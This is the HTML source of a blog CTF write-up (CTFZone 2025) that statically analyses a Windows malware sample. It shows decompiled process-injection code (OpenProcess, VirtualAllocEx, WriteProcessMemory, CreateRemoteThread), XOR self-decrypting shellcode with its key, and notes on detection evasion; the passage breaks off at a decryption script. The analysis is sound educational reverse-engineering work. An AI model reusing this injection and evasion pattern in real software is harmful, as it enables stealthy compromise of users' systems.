@@ -1,0 +1,1537 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="icon" type="image/png" href="/avatar.png">
+<title>C2mmunication, CTFZone 2025 Quals</title>
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<link rel="stylesheet" type='text/css' href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+  integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+  crossorigin="anonymous" referrerpolicy="no-referrer" />
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Sans+Mono:ital,wght@0,400..700;1,400..700&display=swap');
+
+  .font-jersey {
+
+    font-family: "Ubuntu Sans Mono", monospace;
+    font-optical-sizing: auto;
+    font-style: normal;
+  }
+
+
+  .md-content .katex-display {
+    max-width: 100%;
+    overflow-x: auto;
+    overflow-y: hidden;
+    -webkit-overflow-scrolling: touch;
+    padding-left: 0.25rem;
+    padding-right: 0.25rem;
+  }
+
+  .md-content .katex-display>.katex {
+    display: inline-block;
+    max-width: 100%;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: 300ms ease-in-out;
+  }
+
+  .is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: opacity 300ms ease-in-out;
+  }
+
+  html.is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  html.is-animating {
+    cursor: progress;
+  }
+
+  html.is-leaving .swup-transition-fade {
+    opacity: 0;
+  }
+</style>
+
+<script src="https://unpkg.com/swup@4"></script>
+<script src="https://unpkg.com/@swup/preload-plugin@3"></script>
+<script src="https://unpkg.com/@swup/progress-plugin@3"></script>
+<script>
+  const swup = new Swup({
+    containers: ['#swup'],
+    animationSelector: '[class*="swup-transition-"]',
+    cache: true,
+    preload: true,
+    animateHistoryBrowsing: true,
+
+    plugins: [
+      new SwupPreloadPlugin(),
+      new SwupProgressPlugin()
+    ]
+  })
+  window.swup = swup
+</script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
+  crossorigin="anonymous"></script>
+
+<script>
+  
+
+  
+  const KATEX_CONFIG = {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false},
+      {left: "\\[", right: "\\]", display: true},
+      {left: "\\(", right: "\\)", display: false}
+    ],
+    ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+    throwOnError: false
+  };
+
+  
+  function renderKatex() {
+    
+    if (typeof renderMathInElement !== "function") {
+      console.log("⏳ Waiting for KaTeX to load...");
+      return;
+    }
+
+    
+    const contentArea = document.getElementById('swup') || document.body;
+
+    try {
+      renderMathInElement(contentArea, KATEX_CONFIG);
+      console.log("✅ KaTeX rendered successfully");
+    } catch (error) {
+      console.error("❌ KaTeX rendering error:", error);
+    }
+  }
+
+  
+  function renderKatexWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof renderMathInElement === "function") {
+        renderKatex();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ KaTeX auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering KaTeX...");
+        
+        setTimeout(() => renderKatexWithRetry(3, 50), 50);
+      });
+      console.log("✅ KaTeX-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderKatexWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+  
+  window.renderKatex = renderKatex;
+</script>
+
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+
+  let initialized = false;
+
+  function renderMermaid() {
+    const contentArea = document.getElementById('swup') || document.body;
+    const mermaidBlocks = contentArea.querySelectorAll('.language-mermaid, .mermaid');
+
+    if (mermaidBlocks.length === 0) {
+      console.log("ℹ️ No mermaid blocks found on this page");
+      return;
+    }
+
+    if (!initialized) {
+      mermaid.initialize({startOnLoad: false, theme: 'dark'});
+      initialized = true;
+    }
+
+    mermaidBlocks.forEach(el => {
+      if (el.dataset.processed === 'true') {
+        const source = el.dataset.mermaidSource;
+        if (source) {
+          el.innerHTML = source;
+          el.removeAttribute('data-processed');
+        }
+      } else {
+        el.dataset.mermaidSource = el.textContent;
+      }
+    });
+
+    mermaid.run({nodes: mermaidBlocks})
+      .then(() => console.log("✅ Mermaid rendered successfully"))
+      .catch(err => console.error("❌ Mermaid rendering error:", err));
+  }
+
+  function renderMermaidWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof mermaid.initialize === "function") {
+        renderMermaid();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ Mermaid auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering mermaid...");
+        
+        setTimeout(() => renderMermaidWithRetry(3, 50), 50);
+      });
+      console.log("✅ Mermaid-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderMermaidWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+
+
+</script>
+
+
+</head>
+
+<body class="min-h-screen flex flex-col bg-black font-jersey text-white text-3xl">
+  <header>
+    <div class="sticky absolute top-0 z-50">
+  <nav class="w-full border-b border-gray-800 bg-[#070709]/95 backdrop-blur-sm text-gray-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6">
+      <div class="flex items-center justify-between h-16">
+        
+        <div class="flex items-center gap-3">
+
+          <a href='http://localhost:1313/' class="flex items-center gap-3 group" aria-label="Homepage">
+
+            <img src='https://picsum.photos/200' alt="Luca Palumbo"
+              class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
+              style="animation: border-breathe 4s ease-in-out infinite;" />
+            <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
+              Luca Palumbo
+              <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
+            </span>
+          </a>
+        </div>
+
+        
+        <div class="flex items-center gap-4">
+          
+          <div class="hidden md:flex items-center">
+            
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a href="/blog/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Blog</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a aria-current="true" href="/writeup/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/extra/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Extra</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+          </div>
+
+          
+          <div class="md:hidden">
+            <button id="nav-toggle" aria-controls="mobile-menu" aria-expanded="false"
+              class="inline-flex items-center justify-center p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-400"
+              aria-label="Open menu">
+              <svg class="h-6 w-6 text-gray-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                stroke="currentColor" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      
+      <div id="mobile-menu" class="md:hidden hidden pb-4">
+        
+        
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a href="/blog/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Blog</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a aria-current="true" href="/writeup/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/extra/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>Extra</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+      </div>
+    </div>
+  </nav>
+
+  
+  <style>
+    @keyframes flicker {
+      0% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      10% {
+        opacity: 0.2;
+        transform: translateY(-1px);
+      }
+
+      20% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes border-breathe {
+      0% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+
+      50% {
+        box-shadow: 0 0 18px 6px rgba(99, 102, 241, 0.03);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+    }
+  </style>
+
+  
+  <script>
+    (function () {
+      const btn = document.getElementById('nav-toggle');
+      const menu = document.getElementById('mobile-menu');
+      if (!btn || !menu) return;
+      btn.addEventListener('click', () => {
+        const open = menu.classList.toggle('hidden') === false;
+        btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      });
+    })();
+  </script>
+</div>
+
+  </header>
+
+  <main class="flex-1 w-full">
+    <div id="swup" class="swup-transition-fade">
+      <div class="max-w-3xl lg:max-w-6xl xl:max-w-7xl mx-auto px-5 sm:px-8 lg:px-10 py-10 lg:py-16">
+        
+<div class="grid grid-cols-12 gap-8">
+  
+  <aside class="hidden lg:block col-span-3">
+    <div class="sticky top-24">
+      <div class="mb-3 text-xs uppercase tracking-widest text-gray-500">Table of contents</div><nav class="toc border border-gray-800/70 bg-[#070709] rounded-sm p-4 text-base text-gray-300">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-reverse-engineering---main-function-analysis">Initial Reverse Engineering - Main Function Analysis</a></li>
+    <li><a href="#shellcode-extraction-and-decryption">Shellcode Extraction and Decryption</a>
+      <ul>
+        <li><a href="#decrypted-shellcode-analysis">Decrypted Shellcode Analysis</a></li>
+        <li><a href="#challenge-solution">Challenge Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix-hash-based-api-resolution-analysis">Appendix: Hash-Based API Resolution Analysis</a>
+      <ul>
+        <li><a href="#the-api-resolution-routine">The API Resolution Routine</a></li>
+        <li><a href="#how-the-algorithm-works">How the Algorithm Works</a></li>
+        <li><a href="#pseudocode-implementation">Pseudocode Implementation</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a>
+      <ul>
+        <li><a href="#useful-resources">Useful Resources</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </nav></div>
+  </aside>
+
+  
+  <article class="col-span-12 lg:col-span-9">
+    <header class="mb-6">
+  <h1 class="text-2xl sm:text-3xl md:text-4xl tracking-wide text-white">
+    C2mmunication, CTFZone 2025 Quals
+  </h1>
+
+  <div class="mt-2 flex flex-wrap items-center gap-x-3 gap-y-2 text-sm sm:text-base text-gray-400">
+    <span class="font-mono">Aug 21, 2025 • 00:00</span>
+    <span class="text-gray-700">/</span>
+    <span class="font-mono">16 min read</span>
+  </div><div class="mt-3 flex flex-wrap gap-2"><a href="/%20tags/reverse-engineering"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #reverse engineering
+    </a><a href="/%20tags/windows"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #windows
+    </a><a href="/%20tags/c2"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #C2
+    </a><a href="/%20tags/ctfzone"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #CTFZone
+    </a></div></header>
+
+
+    
+    <div class="lg:hidden mb-6">
+      <details class="border border-gray-800/70 bg-[#070709] rounded-sm">
+        <summary class="cursor-pointer select-none px-4 py-3 text-gray-200 hover:text-white transition-colors">
+          Table of contents
+        </summary>
+        <div class="px-4 pb-4 toc text-base text-gray-300">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#initial-reverse-engineering---main-function-analysis">Initial Reverse Engineering - Main Function Analysis</a></li>
+    <li><a href="#shellcode-extraction-and-decryption">Shellcode Extraction and Decryption</a>
+      <ul>
+        <li><a href="#decrypted-shellcode-analysis">Decrypted Shellcode Analysis</a></li>
+        <li><a href="#challenge-solution">Challenge Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#appendix-hash-based-api-resolution-analysis">Appendix: Hash-Based API Resolution Analysis</a>
+      <ul>
+        <li><a href="#the-api-resolution-routine">The API Resolution Routine</a></li>
+        <li><a href="#how-the-algorithm-works">How the Algorithm Works</a></li>
+        <li><a href="#pseudocode-implementation">Pseudocode Implementation</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a>
+      <ul>
+        <li><a href="#useful-resources">Useful Resources</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+      </details>
+    </div>
+
+    <div class="border border-gray-800/70 bg-[#070709] rounded-sm p-5 sm:p-7">
+
+      <div class="md-content text-lg sm:text-xl leading-relaxed text-gray-200">
+        <h1 id="introduction" class=" mt-8 mb-3 text-2xl sm:text-3xl text-white">
+    <span class="relative inline-block">
+      Introduction
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h1>
+<p>The challenge presented us with a password-protected ZIP file. The password was &ldquo;infected&rdquo; - a well-known convention in the cybersecurity community used when sharing actual malware samples to prevent accidental execution.</p>
+<p>Upon extracting the archive, I found a single file named <code>prog.exe_</code>. The underscore appended to the file extension is a common safety measure that disables automatic execution when double-clicking the file in Windows environments.</p>
+<p>These initial observations strongly suggested that we were dealing with real malware rather than a simulated threat. Given the potentially dangerous nature of the sample and the lack of an isolated virtual machine environment, I made the decision to proceed exclusively with static analysis techniques to avoid any risk of system compromise.</p>
+<h1 id="challenge-analysis" class=" mt-8 mb-3 text-2xl sm:text-3xl text-white">
+    <span class="relative inline-block">
+      Challenge Analysis
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h1>
+<h2 id="initial-reverse-engineering---main-function-analysis" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      Initial Reverse Engineering - Main Function Analysis
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>Loading the executable into IDA, I quickly identified the main function and began analyzing its behavior. The decompiled code revealed several interesting operations:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">c</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buff_ptr; <span style="color:#75715e">// r8
+</span></span></span><span style="display:flex;"><span>    _OWORD <span style="color:#f92672">*</span>v5; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">__int64</span> counter; <span style="color:#75715e">// rcx
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... variable declarations ...
+</span></span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> Buffer[<span style="color:#ae81ff">560</span>]; <span style="color:#75715e">// [rsp+40h] [rbp-248h] BYREF
+</span></span></span><span style="display:flex;"><span>    buff_ptr <span style="color:#f92672">=</span> Buffer;
+</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>bytecode_enc;
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span>i64;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy encrypted bytecode to local buffer in chunks
+</span></span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        buff_ptr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">128</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// XMM register operations for efficient memory copying
+</span></span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ... chunk copying logic ...
+</span></span></span><span style="display:flex;"><span>        <span style="color:#f92672">--</span>counter;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> ( counter );
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Process injection sequence
+</span></span></span><span style="display:flex;"><span>    pid <span style="color:#f92672">=</span> <span style="color:#a6e22e">unknown_libname_26</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub_140001010</span>(<span style="color:#e6db74">&#34;Injecting to PID: %i&#34;</span>, pid);
+</span></span><span style="display:flex;"><span>    v18 <span style="color:#f92672">=</span> <span style="color:#a6e22e">unknown_libname_26</span>(argv[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>    process <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(<span style="color:#ae81ff">0x1FFFFFu</span>, <span style="color:#ae81ff">0</span>, v18);
+</span></span><span style="display:flex;"><span>    mem <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(process, <span style="color:#ae81ff">0</span>i64, <span style="color:#ae81ff">0x228u</span>i64, <span style="color:#ae81ff">0x3000u</span>, <span style="color:#ae81ff">0x40u</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">WriteProcessMemory</span>(process, mem, Buffer, <span style="color:#ae81ff">0x228u</span>i64, <span style="color:#ae81ff">0</span>i64);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CreateRemoteThread</span>(process, <span style="color:#ae81ff">0</span>i64, <span style="color:#ae81ff">0</span>i64, (LPTHREAD_START_ROUTINE)mem, <span style="color:#ae81ff">0</span>i64, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>i64);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(process);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>(variable and function names were changed by me)</p>
+<p>The main function performs several key operations:</p>
+<ol>
+<li>
+<p><strong>Shellcode Preparation</strong>: It copies bytes from a global variable (<code>bytecode_enc</code>) into a local buffer, processing the data in chunks using XMM registers for efficient memory operations.</p>
+</li>
+<li>
+<p><strong>Process Targeting</strong>: It opens a target process using the PID specified as a command-line argument.</p>
+</li>
+<li>
+<p><strong>Memory Allocation</strong>: It allocates executable memory space within the target process using <code>VirtualAllocEx</code> with <code>PAGE_EXECUTE_READWRITE</code> permissions.</p>
+</li>
+<li>
+<p><strong>Code Injection</strong>: It writes the prepared shellcode buffer into the allocated memory space of the target process.</p>
+</li>
+<li>
+<p><strong>Remote Execution</strong>: It creates a new thread in the target process that executes the injected shellcode.</p>
+</li>
+<li>
+<p><strong>Cleanup</strong>: It closes the process handle.</p>
+</li>
+</ol>
+<p>This is a classic <strong>process injection</strong> technique commonly used in malware. The purpose of this approach, rather than executing the shellcode directly, is to mask malicious activity. When the injected code runs, any suspicious behavior (high CPU usage, network connections, file system access) will appear to originate from legitimate processes like <code>notepad.exe</code> or other benign applications, making detection significantly more difficult for both users and security software.</p>
+<p>The next step in the analysis was to extract and examine the shellcode stored in the global variable to understand the actual malicious payload.</p>
+<h2 id="shellcode-extraction-and-decryption" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      Shellcode Extraction and Decryption
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>With the main function behavior understood, the next step was to extract and analyze the actual shellcode stored in the global variable. Loading the binary data into IDA Pro revealed an interesting structure.</p>
+<p>The shellcode began with valid x86-64 assembly instructions, but quickly transitioned into what appeared to be random bytes. Upon closer examination of the initial instructions, I discovered a runtime decryption routine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">assembly</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>seg000:0000000000000000 loc_0:                                  ; DATA XREF: seg000:000000000000000A↓o
+</span></span><span style="display:flex;"><span>seg000:0000000000000000                 xor     rcx, rcx
+</span></span><span style="display:flex;"><span>seg000:0000000000000003                 sub     rcx, 0FFFFFFFFFFFFFFC0h
+</span></span><span style="display:flex;"><span>seg000:000000000000000A                 lea     rax, loc_0
+</span></span><span style="display:flex;"><span>seg000:0000000000000011                 mov     rbx, 0E64DDC02B7BACB6Fh
+</span></span><span style="display:flex;"><span>seg000:000000000000001B
+</span></span><span style="display:flex;"><span>seg000:000000000000001B loc_1B:                                 ; CODE XREF: seg000:0000000000000025↓j
+</span></span><span style="display:flex;"><span>seg000:000000000000001B                 xor     qword ptr ds:rva loc_27[rax], rbx
+</span></span><span style="display:flex;"><span>seg000:000000000000001F                 sub     rax, 0FFFFFFFFFFFFFFF8h
+</span></span><span style="display:flex;"><span>seg000:0000000000000025                 loop    loc_1B
+</span></span><span style="display:flex;"><span>seg000:0000000000000027
+</span></span><span style="display:flex;"><span>seg000:0000000000000027 loc_27:                                 ; DATA XREF: seg000:loc_1B↑w
+</span></span><span style="display:flex;"><span>seg000:0000000000000027                 xchg    eax, ebx
+</span></span><span style="display:flex;"><span>seg000:0000000000000028                 cmp     dword ptr [rcx], 53h ; &#39;S&#39;
+</span></span><span style="display:flex;"><span>seg000:000000000000002B                 repne xor al, 81h
+</span></span><span style="display:flex;"><span>seg000:000000000000002B ; ---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>seg000:000000000000002E                 db 0E6h
+</span></span><span style="display:flex;"><span>seg000:000000000000002F ; ---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>seg000:000000000000002F                 outsd
+</span></span><span style="display:flex;"><span>seg000:0000000000000030                 retf
+</span></span><span style="display:flex;"><span>seg000:0000000000000030 ; ---------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>seg000:0000000000000031                 db 0FBh
+</span></span><span style="display:flex;"><span>seg000:0000000000000032                 dw 43E6h, 1F8Ch, 39B7h
+</span></span><span style="display:flex;"><span>seg000:0000000000000038                 dq 0FB4C69467658B83h, 4FB4C6941AE53183h, 1D6D05964800B583h
+</span></span><span style="display:flex;"><span>seg000:0000000000000050                 dq 0C3267C94CB86F79Bh, 0AEA76DF000CBDBF7h, 3D0BAF1D03F6B702h
+</span></span><span style="display:flex;"><span>[...]</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The pattern indicated that the shellcode was implementing <strong>runtime decryption</strong> - a common technique used by malware to evade static analysis. The valid instructions at the beginning were responsible for decrypting the remaining encrypted payload using a hardcoded XOR key.</p>
+<p>I identified the XOR key: <code>0E64DDC02B7BACB6Fh</code>. The decryption process started at offset <code>0x27</code> and continued for the remainder of the shellcode.</p>
+<p>To extract and decrypt the payload:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">python</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> xor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>content <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;prog.exe_&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> file:
